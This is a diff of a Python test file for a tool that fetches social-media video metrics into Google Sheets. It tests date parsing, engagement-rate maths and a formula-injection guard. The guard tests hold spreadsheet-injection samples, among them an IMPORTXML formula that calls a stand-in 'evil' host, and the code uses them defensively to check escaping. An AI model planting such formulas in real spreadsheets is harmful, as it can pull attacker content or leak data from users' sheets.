@@ -5,6 +5,7 @@ from pathlib import Path
 sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
 
 from fetcher import (
+    compute_er_pct,
     detect_content_link,
     extract_channel_id,
     format_duration,
@@ -13,7 +14,9 @@ from fetcher import (
     parse_ddmmyy,
     parse_date_flexible,
     resolve_tiktok_short_url,
+    sheet_text,
     swap_dates_if_needed,
+    write_results_to_sheet,
 )
 
 
@@ -417,3 +420,139 @@ def test_resolve_tiktok_short_url_passthrough_for_normal_url():
 def test_resolve_tiktok_short_url_passthrough_for_non_tiktok_url():
     url = "https://www.youtube.com/watch?v=abc123"
     assert resolve_tiktok_short_url(url) == url
+
+
+# ---- date parsing: abbreviated and Thai months ----
+
+
+def test_parse_date_flexible_abbreviated_english_month():
+    assert parse_date_flexible("22 Oct 2026") == "22/10/26"
+    assert parse_date_flexible("5 Sept 2026") == "05/09/26"
+
+
+def test_parse_date_flexible_thai_full_month_buddhist_year():
+    assert parse_date_flexible("22 ตุลาคม 2569") == "22/10/26"
+
+
+def test_parse_date_flexible_thai_abbreviated_month():
+    assert parse_date_flexible("22 ต.ค. 2569") == "22/10/26"
+    assert parse_date_flexible("1 พ.ค. 2026") == "01/05/26"
+
+
+def test_parse_date_flexible_thai_fallback_month():
+    assert parse_date_flexible("15", "พฤษภาคม 2569") == "15/05/26"
+
+
+def test_parse_date_flexible_invalid_day_or_month_returns_none():
+    assert parse_date_flexible("31 Feb 2026") is None
+    assert parse_date_flexible("15 Foo 2026") is None
+
+
+# ---- ER% ----
+
+
+def test_compute_er_pct_basic():
+    row = {"views": "1000", "likes": "50", "comments": "10", "shares": "", "saves": ""}
+    assert compute_er_pct(row) == "6.00"
+
+
+def test_compute_er_pct_blank_comments_counts_as_zero():
+    # Kick clips never have comments; this used to blank the whole ER%.
+    row = {"views": "1000", "likes": "50", "comments": "", "shares": "", "saves": ""}
+    assert compute_er_pct(row) == "5.00"
+
+
+def test_compute_er_pct_handles_commas_none_and_shares_saves():
+    row = {"views": "1,000", "likes": "None", "comments": "100", "shares": "50", "saves": "50"}
+    assert compute_er_pct(row) == "20.00"
+
+
+def test_compute_er_pct_no_views_is_blank():
+    assert compute_er_pct({"views": "", "likes": "5"}) == ""
+    assert compute_er_pct({"views": "0", "likes": "5"}) == ""
+
+
+# ---- sheet_text (formula-injection guard) ----
+
+
+def test_sheet_text_escapes_formula_prefixes():
+    for text in ('=HYPERLINK("http://x","y")', "+1234", "-cmd", "@SUM(A1)"):
+        assert sheet_text(text) == "'" + text
+
+
+def test_sheet_text_escapes_numeric_and_date_lookalikes():
+    assert sheet_text("1/2") == "'1/2"
+    assert sheet_text("2024") == "'2024"
+
+
+def test_sheet_text_leaves_normal_text_alone():
+    assert sheet_text("Normal caption #POE2") == "Normal caption #POE2"
+    assert sheet_text("https://youtu.be/abc") == "https://youtu.be/abc"
+    assert sheet_text("") == ""
+    assert sheet_text(None) is None
+
+
+# ---- write_results_to_sheet ----
+
+
+class _FakeValues:
+    def __init__(self):
+        self.cleared = []
+        self.written = None
+
+    def clear(self, spreadsheetId, range):
+        self.cleared.append(range)
+        return self
+
+    def update(self, spreadsheetId, range, valueInputOption, body):
+        self.written = body["values"]
+        return self
+
+    def execute(self):
+        return {"updatedCells": 0}
+
+
+class _FakeSheets:
+    def __init__(self):
+        self.vals = _FakeValues()
+
+    def spreadsheets(self):
+        return self
+
+    def values(self):
+        return self.vals
+
+
+def _row(**overrides):
+    row = {
+        "channel_name": "KOL", "subscribers": "10", "platform": "tiktok", "link": "https://x",
+        "content_type": "Short", "published_date": "01/01/26", "views": "100", "likes": "5",
+        "comments": "", "shares": "", "saves": "", "duration": "1", "caption": "hello",
+    }
+    row.update(overrides)
+    return row
+
+
+def test_write_results_empty_does_not_clear_existing_data():
+    svc = _FakeSheets()
+    write_results_to_sheet(svc, "Result", [])
+    assert svc.vals.cleared == []
+    assert svc.vals.written is None
+
+
+def test_write_results_clears_then_writes_when_there_are_results():
+    svc = _FakeSheets()
+    write_results_to_sheet(svc, "Result", [_row()])
+    assert svc.vals.cleared == ["'Result'!A4:N"]
+    assert len(svc.vals.written) == 1
+
+
+def test_write_results_escapes_formula_caption_and_computes_er_with_blank_comments():
+    svc = _FakeSheets()
+    rows = [_row(caption='=IMPORTXML("http://evil","//a")', channel_name="+KOL")]
+    write_results_to_sheet(svc, "Result", rows)
+    written = svc.vals.written[0]
+    assert written[0] == "'+KOL"
+    assert written[13] == "'=IMPORTXML(\"http://evil\",\"//a\")"
+    assert written[12] == "5.00"
+    assert rows[0]["er_pct"] == "5.00"
